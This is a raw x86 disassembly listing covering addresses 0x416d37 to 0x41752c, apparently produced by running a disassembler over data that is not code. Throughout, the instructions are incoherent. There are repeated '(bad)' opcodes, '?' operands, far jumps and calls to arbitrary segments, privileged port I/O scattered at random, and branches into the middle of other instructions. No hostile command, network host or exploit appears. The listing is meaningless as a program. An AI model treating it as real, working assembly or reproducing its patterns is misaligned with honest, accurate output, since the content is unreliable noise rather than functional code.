  416d37:	(bad)  
  416d38:	pop    ebp
  416d39:	adc    ecx,DWORD PTR [ebx]
  416d3b:	cmp    ecx,DWORD PTR [ebx+0x396a300e]
  416d41:	or     edi,esp
  416d43:	aad    0x24
  416d45:	stc    
  416d46:	test   DWORD PTR [eax],ecx
  416d48:	fadd   st(5),st
  416d4a:	mov    edx,DWORD PTR [esi]
  416d4c:	cmp    eax,0x2e6cd666
  416d51:	jo     0x416d68
  416d53:	shr    al,0x72
  416d56:	mov    ecx,0x1552e808
  416d5b:	daa    
  416d5c:	and    DWORD PTR [edx],edi
  416d5e:	mov    ch,0xd6
  416d60:	cmp    cl,BYTE PTR [ebp-0x5]
  416d63:	les    eax,FWORD PTR [eax]
  416d65:	mov    WORD PTR [esi],ss
  416d67:	push   esp
  416d68:	xor    al,0x8c
  416d6a:	mov    ebp,ebp
  416d6c:	fsub   st(1),st
  416d6e:	xor    BYTE PTR [ebp-0x2c24b23d],ah
  416d74:	out    dx,eax
  416d75:	test   BYTE PTR [ebp+0x63],al
  416d78:	adc    DWORD PTR [edx+0xf3f275c],0x298d7371
  416d82:	loope  0x416d73
  416d84:	fist   DWORD PTR [esi+0x75]
  416d87:	mov    edx,0xc0a74ac5
  416d8c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416d8d:	add    edi,edi
  416d8f:	fdivp  st(1),st
  416d91:	mov    eax,0xd344cf11
  416d96:	loop   0x416e0b
  416d98:	or     cl,dh
  416d9a:	and    BYTE PTR [eax],0x2c
  416d9d:	(bad)  
  416d9f:	in     eax,dx
  416da0:	xchg   ebp,eax
  416da1:	fld    TBYTE PTR [ebx]
  416da3:	jne    0x416d84
  416da5:	mov    eax,0xfa15c27a
  416daa:	in     eax,dx
  416dab:	neg    ebp
  416dad:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  416daf:	sahf   
  416db0:	add    al,0x5a
  416db2:	sahf   
  416db3:	outs   dx,BYTE PTR ds:[esi]
  416db4:	daa    
  416db5:	mov    al,ds:0xe3bcb36b
  416dba:	push   0x45
  416dbc:	sub    al,0x57
  416dbe:	mov    esi,0x533c5d81
  416dc3:	cmp    al,0xf8
  416dc5:	jg     0x416dc4
  416dc7:	cmc    
  416dc8:	(bad)  
  416dc9:	push   0xffffffa9
  416dcb:	scas   eax,DWORD PTR es:[edi]
  416dcc:	adc    edx,0x72
  416dcf:	jmp    0xcfc3:0x45ddbce
  416dd6:	cmp    bl,al
  416dd8:	cmp    al,0x3
  416dda:	stc    
  416ddb:	(bad)  
  416ddc:	xor    BYTE PTR [eax],ah
  416dde:	sub    al,0x67
  416de0:	lock mov WORD PTR [edi],fs
  416de3:	dec    ebx
  416de4:	iret   
  416de5:	fnstcw WORD PTR [ebp+ecx*4+0x6a]
  416de9:	pushaw 
  416deb:	(bad)  
  416dec:	mov    ds:0xed50f549,eax
  416df1:	pushf  
  416df2:	dec    ebx
  416df3:	popf   
  416df4:	les    ecx,FWORD PTR [edi]
  416df6:	rcl    BYTE PTR [esi],0xcc
  416df9:	jge    0x416e11
  416dfb:	cli    
  416dfc:	cli    
  416dfd:	scas   eax,DWORD PTR es:[edi]
  416dfe:	or     ecx,DWORD PTR [ebx-0x758e6e11]
  416e04:	jp     0x416e3b
  416e06:	outs   dx,DWORD PTR ds:[esi]
  416e07:	icebp  
  416e08:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416e09:	mov    ecx,DWORD PTR [esi-0x20]
  416e0c:	or     edi,ebx
  416e0e:	shr    DWORD PTR [edi-0x78bba0df],0x7f
  416e15:	mov    WORD PTR [edx-0x7520c205],ds
  416e1b:	inc    esp
  416e1c:	test   BYTE PTR [eax-0x197b4e68],bl
  416e22:	inc    ecx
  416e23:	push   ds
  416e24:	clc    
  416e25:	xor    edx,DWORD PTR [edi+0x7b8e306]
  416e2b:	adc    edx,DWORD PTR [esi+0x24]
  416e2e:	hlt    
  416e2f:	push   0x65
  416e31:	outs   dx,BYTE PTR ds:[esi]
  416e32:	xor    BYTE PTR [ebp+0x31],cl
  416e35:	call   DWORD PTR [eax]
  416e37:	add    ch,BYTE PTR [eax-0x71cd13e0]
  416e3d:	or     ch,BYTE PTR [eax+0x26]
  416e40:	mov    ss,WORD PTR [ebp-0x43]
  416e43:	mov    edx,0xd484ab32
  416e48:	popa   
  416e49:	test   al,0x3
  416e4b:	out    0x2b,eax
  416e4d:	dec    ebp
  416e4e:	sub    DWORD PTR [esi+0x2c],eax
  416e51:	fs jnp 0x416e7f
  416e54:	adc    edx,edi
  416e56:	fs dec ebx
  416e58:	and    ch,BYTE PTR [esi+0x3e27a6fb]
  416e5e:	stc    
  416e5f:	push   edx
  416e60:	ins    BYTE PTR es:[edi],dx
  416e61:	ret    
  416e62:	(bad)  
  416e65:	shl    BYTE PTR [esi],0x5b
  416e68:	inc    ecx
  416e69:	int3   
  416e6a:	jecxz  0x416e5f
  416e6c:	mov    DWORD PTR [ebx],0x381b6062
  416e72:	leave  
  416e73:	dec    edi
  416e74:	sbb    BYTE PTR [ecx-0x2b],0x17
  416e78:	stos   DWORD PTR es:[edi],eax
  416e79:	loope  0x416e37
  416e7b:	icebp  
  416e7c:	lahf   
  416e7d:	sbb    BYTE PTR [esp+ecx*4+0x32f6e254],bl
  416e84:	push   cs
  416e85:	fistp  DWORD PTR [esi+0x5abcbab1]
  416e8b:	shr    esi,1
  416e8d:	adc    DWORD PTR [esi+ebx*1-0x5bcc9bad],ebx
  416e94:	in     al,0x5c
  416e96:	shl    DWORD PTR [ebx+0x5fccf248],0xea
  416e9d:	loope  0x416e44
  416e9f:	cmp    al,0x38
  416ea1:	push   esi
  416ea2:	or     BYTE PTR [ecx],bh
  416ea4:	push   ebp
  416ea5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416ea6:	cmp    ebp,DWORD PTR [ebp+0x70]
  416ea9:	ds fmulp st(1),st
  416eac:	sub    bh,cl
  416eae:	test   eax,0x9b652096
  416eb3:	push   esp
  416eb4:	pop    edx
  416eb5:	hlt    
  416eb6:	or     eax,0x4bbadd43
  416ebb:	push   0x35
  416ebd:	pop    ecx
  416ebe:	mov    eax,0x4cd1971a
  416ec3:	nop
  416ec4:	imul   edi,eax,0x66718e9
  416eca:	aaa    
  416ecb:	xchg   ecx,eax
  416ecc:	rol    DWORD PTR [ebx+0x6f968362],cl
  416ed2:	es aam 0x9a
  416ed5:	js     0x416f25
  416ed7:	add    bh,dh
  416ed9:	and    al,0x23
  416edb:	lahf   
  416edc:	push   es
  416edd:	mov    edi,0x87b087c7
  416ee2:	xor    edx,esp
  416ee4:	push   es
  416ee5:	sub    DWORD PTR [ecx],edx
  416ee7:	jmp    0xe639:0xe29e3642
  416eee:	shl    dl,0x67
  416ef1:	jmp    0x416f10
  416ef3:	in     eax,0xf3
  416ef5:	nop
  416ef6:	lock (bad) 
  416ef8:	and    bl,BYTE PTR [ecx+0x42]
  416efb:	scas   al,BYTE PTR es:[edi]
  416efc:	mov    ebp,DWORD PTR [esi+0x7b]
  416eff:	addr16 aaa 
  416f01:	jmp    0xcd9e7eb2
  416f06:	xchg   esp,eax
  416f07:	ret    
  416f08:	push   esp
  416f09:	push   ecx
  416f0a:	dec    esp
  416f0b:	(bad)  
  416f0c:	jge    0x416f21
  416f0e:	xor    eax,DWORD PTR [esi-0x1a4f34b]
  416f14:	cmp    DWORD PTR [ebx-0x34],edx
  416f17:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416f18:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416f19:	dec    edx
  416f1a:	add    cl,BYTE PTR [edx-0x527fa6e4]
  416f20:	fdivr  QWORD PTR [ecx]
  416f22:	inc    esp
  416f23:	inc    edx
  416f24:	ficomp DWORD PTR [edi]
  416f26:	fdiv   st,st(3)
  416f28:	out    0x1,eax
  416f2a:	push   esp
  416f2b:	repz addr16 mov cl,0x86
  416f2f:	inc    ebx
  416f30:	jbe    0x416ede
  416f32:	jecxz  0x416f3c
  416f34:	test   DWORD PTR fs:[eax],ebp
  416f37:	sbb    al,0xf1
  416f39:	stc    
  416f3a:	cli    
  416f3b:	cmc    
  416f3c:	shl    DWORD PTR [edx],cl
  416f3e:	imul   esp,DWORD PTR [esi+eax*4],0x7b8e6e8e
  416f45:	push   edx
  416f46:	in     eax,dx
  416f47:	xchg   ebx,eax
  416f48:	inc    eax
  416f49:	xor    al,0x18
  416f4b:	in     eax,0x2f
  416f4d:	jns    0x416f0d
  416f4f:	jmp    0x416f50
  416f51:	xor    WORD PTR ss:[edi],0xffb7
  416f56:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416f57:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416f58:	loope  0x416f78
  416f5a:	xor    BYTE PTR [ecx-0x3b45dcc9],al
  416f60:	mov    ah,0xe8
  416f62:	and    al,0x7d
  416f64:	ins    DWORD PTR es:[edi],dx
  416f65:	mov    al,ds:0x73a53433
  416f6a:	repz sbb eax,0x6fa278ec
  416f70:	(bad)  
  416f71:	mov    edi,0x36437ae8
  416f76:	jb     0x416f1f
  416f78:	or     edi,ecx
  416f7a:	sbb    esp,DWORD PTR [eax]
  416f7c:	test   ebx,ebx
  416f7e:	pop    eax
  416f7f:	sbb    al,0x53
  416f81:	mov    edx,0xd053db81
  416f86:	imul   ebx,ebp,0x1e
  416f89:	mov    dh,0xd7
  416f8b:	cmp    DWORD PTR [esi+eiz*8+0x19],esi
  416f8f:	(bad)  
  416f90:	dec    ecx
  416f91:	div    DWORD PTR [edx+0x20]
  416f94:	jmp    ecx
  416f96:	xchg   esp,eax
  416f97:	jns    0x416fe5
  416f99:	inc    ebx
  416f9a:	xchg   BYTE PTR [eax],ch
  416f9c:	mov    edx,0x589d48a8
  416fa1:	out    dx,eax
  416fa2:	outs   dx,DWORD PTR ds:[esi]
  416fa3:	inc    eax
  416fa4:	xlat   BYTE PTR ds:[ebx]
  416fa5:	loopne 0x416fda
  416fa7:	out    dx,eax
  416fa8:	or     BYTE PTR [ecx+ebp*4-0x7b],al
  416fac:	test   eax,0xd738401a
  416fb1:	scas   eax,DWORD PTR es:[edi]
  416fb2:	test   eax,0x6474467e
  416fb7:	cmp    BYTE PTR [edi],ah
  416fb9:	lods   al,BYTE PTR ds:[esi]
  416fba:	clc    
  416fbb:	xchg   BYTE PTR [ecx+0x22],ah
  416fbe:	fcmovbe st,st(0)
  416fc0:	mov    ch,0x95
  416fc2:	or     DWORD PTR [esi+0x3f],esi
  416fc5:	xchg   edi,eax
  416fc6:	dec    esp
  416fc7:	in     al,dx
  416fc8:	aaa    
  416fc9:	mov    ds:0xcf5743b,eax
  416fce:	into   
  416fcf:	sbb    ah,BYTE PTR [ebp+eiz*8-0x70]
  416fd3:	lock movups xmm7,XMMWORD PTR [ebp+0x26]
  416fd8:	and    eax,0x7ac7d6c4
  416fdd:	pop    eax
  416fde:	jne    0x417020
  416fe0:	inc    ebp
  416fe1:	popa   
  416fe2:	sbb    al,dl
  416fe4:	mov    edi,0x24f1b108
  416fe9:	test   eax,0xb3f63e6d
  416fee:	jb     0x416f96
  416ff0:	sar    ecx,0x43
  416ff3:	es hlt 
  416ff5:	jbe    0x417020
  416ff7:	sbb    eax,0xd7adb7d4
  416ffc:	push   edi
  416ffd:	jge    0x416f8f
  416fff:	retf   0x969a
  417002:	enter  0x86a8,0xc0
  417006:	pop    ecx
  417007:	mov    BYTE PTR [ebp-0x39ab49ab],dl
  41700d:	xchg   esi,eax
  41700e:	gs and eax,0xa29e47f3
  417014:	sti    
  417015:	test   eax,0xc83b6dd6
  41701a:	or     esi,DWORD PTR [edx]
  41701c:	mov    WORD PTR [eax-0x16],gs
  41701f:	test   dh,al
  417021:	push   DWORD PTR [esi]
  417023:	sub    ebx,DWORD PTR [eax+0x4b02bea4]
  417029:	repnz pop edi
  41702b:	dec    edx
  41702c:	jmp    0xa44c:0x366f0196
  417033:	pop    ebx
  417034:	dec    edi
  417035:	mov    eax,ds:0x5c0668
  41703a:	imul   esi,edx,0x7244353
  417040:	push   esi
  417041:	and    BYTE PTR [esi],0x94
  417044:	xchg   esp,eax
  417045:	test   al,0x68
  417047:	dec    ecx
  417048:	lds    ebx,FWORD PTR [edx+0xf0879f5]
  41704e:	inc    ecx
  41704f:	pop    esp
  417050:	aas    
  417051:	cmp    eax,0xe25a2cf0
  417056:	mov    gs,WORD PTR [edx-0x8]
  417059:	cld    
  41705a:	retf   
  41705b:	mov    dl,0x93
  41705d:	(bad)  
  41705e:	xchg   edx,eax
  41705f:	out    dx,al
  417060:	jne    0x417043
  417062:	mov    DWORD PTR [edi-0x6c701bc0],ecx
  417068:	pop    edx
  417069:	jl     0x4170c6
  41706b:	push   edx
  41706c:	lock sub bl,BYTE PTR cs:[ebp+0x18b1143b]
  417074:	mov    eax,ds:0x4f252fcf
  417079:	repnz into 
  41707b:	fcmovnbe st,st(0)
  41707d:	neg    BYTE PTR [edi]
  41707f:	mov    ebp,0x897b0a46
  417084:	xchg   ebx,eax
  417085:	pop    es
  417086:	out    dx,al
  417087:	loopne 0x4170f1
  417089:	jmp    0xdb66:0x862f82f4
  417090:	popa   
  417091:	inc    ecx
  417092:	dec    ecx
  417093:	shl    BYTE PTR [ebx+0x7c],cl
  417096:	rol    DWORD PTR [esi-0x3af89224],0x8c
  41709d:	arpl   WORD PTR [esp+edx*4],bx
  4170a0:	aam    0xf2
  4170a2:	addr16 jae 0x4170e6
  4170a5:	fidiv  WORD PTR [ebp+esi*2+0x52]
  4170a9:	mov    edi,0xaf55236a
  4170ae:	(bad)  
  4170af:	stc    
  4170b0:	mov    ah,0xe5
  4170b2:	mov    cl,0xd7
  4170b4:	aad    0x48
  4170b6:	test   al,0xd4
  4170b8:	sub    al,0x5
  4170ba:	popf   
  4170bb:	cdq    
  4170bc:	fxch   st(0)
  4170be:	cmp    cl,BYTE PTR [esi*2-0x41af5643]
  4170c5:	leave  
  4170c6:	ins    DWORD PTR es:[edi],dx
  4170c7:	sub    eax,0xa3d054e1
  4170cc:	xor    BYTE PTR [ebp-0x71],0xb1
  4170d0:	mov    ah,0x77
  4170d2:	xchg   DWORD PTR [eax],esp
  4170d4:	mov    edi,0x2ca0ff3c
  4170d9:	and    al,BYTE PTR [ecx-0x948bbbc]
  4170df:	adc    bl,dh
  4170e1:	addr16 jmp 0x83d772a2
  4170e7:	neg    DWORD PTR [edx+0x12]
  4170ea:	(bad)  [eax-0x7fe92bfb]
  4170f0:	dec    esp
  4170f1:	sbb    ebx,DWORD PTR [edx+0x608b1718]
  4170f7:	adc    DWORD PTR [edx],0xffffffdb
  4170fa:	add    DWORD PTR [edi+0x54],ebp
  4170fd:	enter  0x5745,0xc0
  417101:	mov    bh,0xfb
  417103:	add    dl,BYTE PTR [esi+ebp*2+0x68]
  417107:	mov    esi,DWORD PTR [ebp+edi*8+0x2c]
  41710b:	out    dx,eax
  41710c:	outs   dx,BYTE PTR ds:[esi]
  41710d:	pop    esi
  41710e:	jo     0x4170ae
  417110:	jle    0x417179
  417112:	fst    DWORD PTR [esi]
  417114:	push   ds
  417115:	add    DWORD PTR [ebx+0x77],0x73
  417119:	dec    ebx
  41711a:	test   eax,0x2ecca784
  41711f:	enter  0xdc93,0xf3
  417123:	mov    eax,ds:0x727985af
  417128:	cli    
  417129:	or     al,0x7d
  41712b:	xor    al,0xa8
  41712d:	test   eax,0x226df2c5
  417132:	pop    esp
  417133:	jecxz  0x417197
  417135:	mov    ds:0x3b74d143,al
  41713a:	push   0x159b4149
  41713f:	(bad)  
  417140:	les    esp,FWORD PTR [esi+0x3c519bec]
  417146:	leave  
  417147:	ror    BYTE PTR [ebp+0x6b],1
  41714a:	aad    0xa0
  41714c:	jnp    0x41713f
  41714e:	ins    BYTE PTR es:[edi],dx
  41714f:	dec    edi
  417150:	(bad)  
  417151:	jmp    0x9906:0xe478314d
  417158:	and    eax,0x6ba48368
  41715d:	(bad)  
  41715e:	mov    bh,0xfb
  417161:	test   eax,0x43cc9ef6
  417166:	mov    ebp,0xd379a74
  41716b:	ja     0x4171aa
  41716d:	pop    edx
  41716e:	stos   BYTE PTR es:[edi],al
  41716f:	test   DWORD PTR [ecx],eax
  417171:	je     0x41714d
  417173:	sbb    BYTE PTR [edi+esi*4],ch
  417176:	int3   
  417177:	push   cs
  417178:	inc    esi
  417179:	shl    dl,cl
  41717b:	jle    0x41710d
  41717d:	retf   
  41717e:	add    DWORD PTR [ebx+eiz*4-0x7baff804],ecx
  417185:	cwde   
  417186:	xor    bh,cl
  417188:	sub    cl,BYTE PTR [ebx-0x23d2ac9]
  41718e:	dec    ecx
  41718f:	fmul   DWORD PTR [eax]
  417191:	jmp    0x191d:0xaaaa8b24
  417198:	pop    ebx
  417199:	repz cwde 
  41719b:	icebp  
  41719c:	sub    eax,0xff657a7a
  4171a1:	xor    DWORD PTR [ebx+0x14720c84],edx
  4171a7:	out    dx,eax
  4171a8:	adc    DWORD PTR [ebx-0x3e],eax
  4171ab:	dec    esi
  4171ac:	sub    ebx,DWORD PTR [eax-0x3393113c]
  4171b2:	fild   WORD PTR [edx]
  4171b4:	inc    ebx
  4171b5:	fst    DWORD PTR [edx-0x5116ff2b]
  4171bb:	div    dh
  4171bd:	cld    
  4171be:	repz sub al,0xf1
  4171c1:	(bad)
  4171c4:	sbb    BYTE PTR [edx-0x30e3ff8c],0x77
  4171cb:	ret    
  4171cc:	mov    ebx,ebp
  4171ce:	lahf   
  4171cf:	call   0x58f600ae
  4171d4:	in     al,0x55
  4171d6:	push   ebp
  4171d7:	(bad)  
  4171d8:	out    0x2,eax
  4171da:	fs sbb cl,cl
  4171dd:	fisttp QWORD PTR [edx+edx*8]
  4171e0:	and    al,0x9f
  4171e2:	repnz dec eax
  4171e4:	push   edi
  4171e5:	push   ebp
  4171e6:	xchg   edi,eax
  4171e7:	jns    0x4171b6
  4171e9:	pop    esp
  4171ea:	xor    eax,0xb3c88684
  4171ef:	and    bh,BYTE PTR [eax-0x68]
  4171f2:	pop    ss
  4171f3:	dec    ecx
  4171f4:	mov    WORD PTR [ecx+0x6d],?
  4171f7:	(bad)  
  4171f9:	mov    cl,0xb9
  4171fb:	mov    eax,ds:0xf7ab59ab
  417200:	iret   
  417201:	jmp    0x1a91:0x3b6448e4
  417208:	stos   DWORD PTR es:[edi],eax
  417209:	sar    BYTE PTR [edi],cl
  41720b:	or     eax,0x12787456
  417210:	stos   DWORD PTR es:[edi],eax
  417211:	and    DWORD PTR [eax-0xa],0xffffffba
  417215:	pop    ss
  417216:	adc    edx,ebp
  417218:	jmp    0x967b6215
  41721d:	push   esp
  41721e:	pop    esi
  41721f:	dec    edi
  417220:	inc    esp
  417221:	imul   edi,DWORD PTR [edx+0x55],0x1cb9d770
  417228:	mov    ds:0x8751a21f,al
  41722d:	xor    eax,0x642cbcaf
  417232:	stc    
  417233:	call   0xd204:0xd0d13808
  41723a:	inc    eax
  41723b:	lds    esp,FWORD PTR [ecx-0x66747351]
  417241:	jb     0x417227
  417243:	and    DWORD PTR [eax-0x4657afa2],edi
  417249:	test   al,0xba
  41724b:	shr    BYTE PTR [esi],cl
  41724d:	cdq    
  41724e:	je     0x41729d
  417250:	add    esi,ebx
  417252:	pushf  
  417253:	mov    ?,WORD PTR [ecx+0x58]
  417256:	fistp  WORD PTR [edx+0x34]
  417259:	xor    ch,dl
  41725b:	push   esp
  41725c:	pop    ebp
  41725d:	mov    edx,0x6b506df7
  417262:	fwait
  417263:	dec    ecx
  417264:	xor    al,0x6d
  417266:	jecxz  0x41721a
  417268:	cmp    al,0xdc
  41726a:	push   eax
  41726b:	dec    esi
  41726c:	lock icebp 
  41726e:	mov    dl,0xe3
  417270:	pushf  
  417271:	jb     0x417236
  417273:	and    BYTE PTR ds:0x70dc8c22,0x46
  41727a:	xchg   esi,eax
  41727b:	fbld   TBYTE PTR [ebp-0x1714d9da]
  417281:	lods   eax,DWORD PTR ds:[esi]
  417282:	aad    0xac
  417284:	mov    ch,0xe6
  417286:	aam    0xac
  417288:	(bad)  
  417289:	outs   dx,BYTE PTR ds:[esi]
  41728a:	mov    ds:0x16672422,al
  41728f:	xor    eax,0xc281cbff
  417294:	jg     0x4172dc
  417296:	and    al,0x8a
  417298:	or     dh,BYTE PTR [edx]
  41729a:	mov    BYTE PTR [eax+0x4e],bh
  41729d:	stc    
  41729e:	(bad)  
  41729f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4172a0:	adc    bl,cl
  4172a2:	enter  0x93b1,0x32
  4172a6:	mov    ds:0x524f0167,eax
  4172ab:	pop    esi
  4172ac:	je     0x417311
  4172ae:	pushf  
  4172af:	push   eax
  4172b0:	pop    eax
  4172b1:	jg     0x4172c4
  4172b3:	rcr    BYTE PTR ds:0xe71adb7,1
  4172b9:	or     BYTE PTR [ebp+ebp*1-0x60bbf6b0],bh
  4172c0:	aad    0x11
  4172c2:	imul   edx,DWORD PTR [edi+0x5e],0x64
  4172c6:	aam    0x1d
  4172c8:	les    ebx,FWORD PTR [ecx]
  4172ca:	retf   
  4172cb:	and    eax,0x9c9daaad
  4172d0:	xor    BYTE PTR [ebx-0x2223b523],ch
  4172d6:	cmp    DWORD PTR [edx],ebx
  4172d8:	pop    esp
  4172d9:	cld    
  4172da:	jmp    0x1bb0485f
  4172df:	pop    ss
  4172e0:	(bad)  
  4172e2:	fcomip st,st(0)
  4172e4:	xor    al,0x39
  4172e6:	sub    al,0x7a
  4172e8:	ja     0x417313
  4172ea:	stos   DWORD PTR es:[edi],eax
  4172eb:	rcr    dl,1
  4172ed:	(bad)  
  4172ee:	aas    
  4172ef:	ret    
  4172f0:	xor    ch,BYTE PTR ds:[ebx+0x75]
  4172f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4172f5:	dec    edx
  4172f6:	push   ebp
  4172f7:	js     0x417347
  4172f9:	lods   eax,DWORD PTR ds:[esi]
  4172fa:	mov    ebx,0x47ea65c4
  4172ff:	test   DWORD PTR [edi],ecx
  417301:	ss inc esp
  417303:	jge    0x417303
  417305:	div    BYTE PTR [esp+edi*2-0xfa0adbc]
  41730c:	pop    ebp
  41730d:	adc    BYTE PTR [ebx],ah
  41730f:	mov    al,ds:0x2159dbda
  417314:	inc    edx
  417315:	push   ebx
  417316:	push   eax
  417317:	fistp  WORD PTR [eax]
  417319:	nop
  41731a:	jno    0x417343
  41731c:	fbstp  TBYTE PTR [ecx]
  41731e:	mov    bh,0xc1
  417320:	dec    esi
  417321:	ret    
  417322:	mov    al,ds:0x39ffa387
  417327:	xor    al,0xeb
  417329:	jnp    0x417387
  41732b:	adc    BYTE PTR [esi-0x17],ah
  41732e:	repz and DWORD PTR [edx+0x432d524f],edi
  417335:	adc    DWORD PTR [edx],edi
  417337:	or     DWORD PTR [ecx-0xc],esp
  41733a:	add    bh,ch
  41733c:	push   ds
  41733d:	(bad)  
  41733f:	push   0x30
  417341:	xchg   BYTE PTR [esi+0x3f],bl
  417344:	fs (bad) 
  417347:	aam    0x39
  417349:	sub    al,0x8b
  41734b:	pushf  
  41734c:	sbb    dl,dl
  41734e:	in     al,0xb6
  417350:	jae    0x41733e
  417352:	cmp    eax,0xadabaab5
  417357:	jae    0x417328
  417359:	or     eax,0x6cc6b325
  41735e:	add    cl,al
  417360:	icebp  
  417361:	daa    
  417362:	fild   DWORD PTR [ecx]
  417364:	xor    al,0x53
  417366:	and    edi,ebp
  417368:	xor    BYTE PTR [edi+eiz*1+0x40e24637],0xc6
  417370:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417371:	sbb    DWORD PTR [edi],edx
  417373:	xor    eax,0xdbd15c83
  417378:	xor    edi,DWORD PTR ds:0xc21f1e99
  41737e:	loopne 0x417353
  417380:	pop    ss
  417381:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417382:	mov    edi,0xc7aeb358
  417387:	adc    eax,0xc1cb29b4
  41738c:	and    DWORD PTR [ecx],ebx
  41738e:	xor    eax,0x88ed3499
  417393:	pop    ebx
  417394:	jge    0x417359
  417396:	test   BYTE PTR [esi+0x15f058bb],cl
  41739c:	add    BYTE PTR [ebx],dh
  41739e:	icebp  
  41739f:	lock ins BYTE PTR es:[edi],dx
  4173a1:	sbb    esi,DWORD PTR [edx+0x74]
  4173a4:	adc    edi,DWORD PTR [eax+0xa972395]
  4173aa:	cmp    al,0xa2
  4173ac:	fcomp  DWORD PTR [ebx+eax*2-0x3c]
  4173b0:	shl    DWORD PTR [edi+0x21],cl
  4173b3:	inc    ebp
  4173b4:	outs   dx,BYTE PTR ds:[esi]
  4173b5:	push   0xffffffac
  4173b7:	or     BYTE PTR [edi+0x5515dcef],dl
  4173bd:	fiadd  DWORD PTR [ebx]
  4173bf:	sub    eax,0x8a4a14a0
  4173c4:	lock outs dx,DWORD PTR ds:[esi]
  4173c6:	and    DWORD PTR [esi],eax
  4173c8:	(bad)  
  4173c9:	test   al,0x12
  4173cb:	and    cl,BYTE PTR [ebp-0x10]
  4173ce:	xor    eax,0x101bc12d
  4173d3:	scas   al,BYTE PTR es:[edi]
  4173d4:	(bad)  
  4173d5:	sub    ch,bl
  4173d7:	iret   
  4173d8:	xor    ecx,0x37c93224
  4173de:	retf   
  4173df:	fst    QWORD PTR [esi+edi*8]
  4173e2:	fstp   TBYTE PTR [ebp+0x1a]
  4173e5:	push   ebp
  4173e6:	imul   ebp,DWORD PTR [ebp-0x181774c8],0xffffffd0
  4173ed:	xor    eax,0x1c4405fd
  4173f2:	sbb    al,0x4f
  4173f4:	push   cs
  4173f5:	and    DWORD PTR [ebp+0x46],edx
  4173f8:	fwait
  4173f9:	and    edi,DWORD PTR [ecx+0xb6d55f6]
  4173ff:	sbb    dh,ch
  417401:	pop    ebx
  417402:	or     esp,edx
  417404:	jg     0x417416
  417406:	or     dh,al
  417408:	and    DWORD PTR [esp+edi*2],0x38
  41740c:	scas   al,BYTE PTR es:[edi]
  41740d:	jg     0x417444
  41740f:	cld    
  417410:	call   0x2b7fc773
  417415:	mov    dh,0xce
  417417:	xchg   ecx,eax
  417418:	repnz pusha 
  41741a:	shl    DWORD PTR [esi],0x11
  41741d:	dec    edx
  41741e:	je     0x41740f
  417420:	mov    edx,0xf6a42807
  417425:	mov    ds:0xf0d0add4,eax
  41742a:	or     dh,dh
  41742c:	bound  ebp,QWORD PTR [ecx-0x60b843bc]
  417432:	outs   dx,DWORD PTR ds:[esi]
  417433:	jmp    0x4174a9
  417435:	ss push edi
  417437:	js     0x417432
  417439:	dec    eax
  41743a:	pop    DWORD PTR [ecx+esi*2+0x6b]
  41743e:	dec    edx
  41743f:	xor    al,0x80
  417441:	push   ecx
  417442:	push   0x88a4d39c
  417447:	dec    edi
  417448:	mov    ebp,0x84598ba1
  41744d:	es loopne 0x417436
  417450:	add    bh,ch
  417452:	rcr    DWORD PTR [eax+0x78],0x1d
  417456:	cmp    ecx,edx
  417458:	inc    ecx
  417459:	add    eax,0x701328bd
  41745e:	inc    edx
  41745f:	vpaddsb ymm5,ymm2,YMMWORD PTR [edx+0x508298b]
  417467:	and    esi,0xbc8df19f
  41746d:	or     bl,dl
  41746f:	push   0x49f6bcd
  417474:	jl     0x4174f2
  417476:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417477:	sbb    dh,BYTE PTR [edx+0x75023fc6]
  41747d:	lea    esp,[ebx+0x44]
  417480:	pop    ebx
  417481:	loop   0x4174cd
  417483:	inc    ecx
  417484:	pop    edx
  417485:	push   ds
  417486:	and    BYTE PTR [edx],bl
  417488:	jmp    0x4174fc
  41748a:	(bad)  
  41748c:	adc    BYTE PTR [eax-0x441d0e02],dh
  417492:	cmc    
  417493:	add    esp,DWORD PTR [ebx]
  417495:	mov    al,0x91
  417497:	or     eax,0xddebfd0e
  41749c:	pop    ss
  41749d:	fwait
  41749e:	pop    ecx
  41749f:	sbb    DWORD PTR [ebp-0x693e7e4f],eax
  4174a5:	std    
  4174a6:	jp     0x4174f4
  4174a8:	sbb    eax,ebx
  4174aa:	lea    edi,[ecx+0x64b96bb4]
  4174b0:	hlt    
  4174b1:	and    al,0x20
  4174b3:	imul   ebx,DWORD PTR [ebp-0x2c10618b],0xd19a62e6
  4174bd:	pop    edx
  4174be:	call   0xe80:0x84b615f4
  4174c5:	pusha  
  4174c6:	pop    esi
  4174c7:	pop    ebx
  4174c8:	ret    0x595f
  4174cb:	test   BYTE PTR [edx-0x10],bh
  4174ce:	adc    BYTE PTR [ecx+0x79],dl
  4174d1:	mov    WORD PTR [ebp-0x6e3e3f15],?
  4174d7:	aas    
  4174d8:	push   ds
  4174d9:	nop
  4174da:	into   
  4174db:	mov    eax,0xf404e3c0
  4174e0:	(bad)  
  4174e1:	call   0xa191:0xcf56fd74
  4174e8:	aas    
  4174e9:	jno    0x41746f
  4174eb:	pop    ebp
  4174ec:	jg     0x41749c
  4174ee:	js     0x417485
  4174f0:	push   edi
  4174f1:	repz dec esi
  4174f3:	leave  
  4174f4:	enter  0x3199,0xe4
  4174f8:	(bad)  
  4174f9:	pusha  
  4174fa:	pop    ebx
  4174fb:	or     BYTE PTR [edi-0x44a244f3],dl
  417501:	arpl   WORD PTR [edi-0xb7a643d],sp
  417507:	sub    BYTE PTR [esi],ah
  417509:	xor    BYTE PTR [edx-0x57],cl
  41750c:	loopne 0x417504
  41750e:	and    ch,al
  417510:	cmp    eax,0x7fdf572
  417515:	pop    ecx
  417516:	inc    DWORD PTR [edi-0x5014e3b0]
  41751c:	and    bl,BYTE PTR [ebp+0x2a766699]
  417522:	mov    ss,esp
  417524:	or     eax,0x4932d829
  417529:	add    ebp,DWORD PTR [eax]
  41752b:	pop    ss
  41752c:	(bad)  
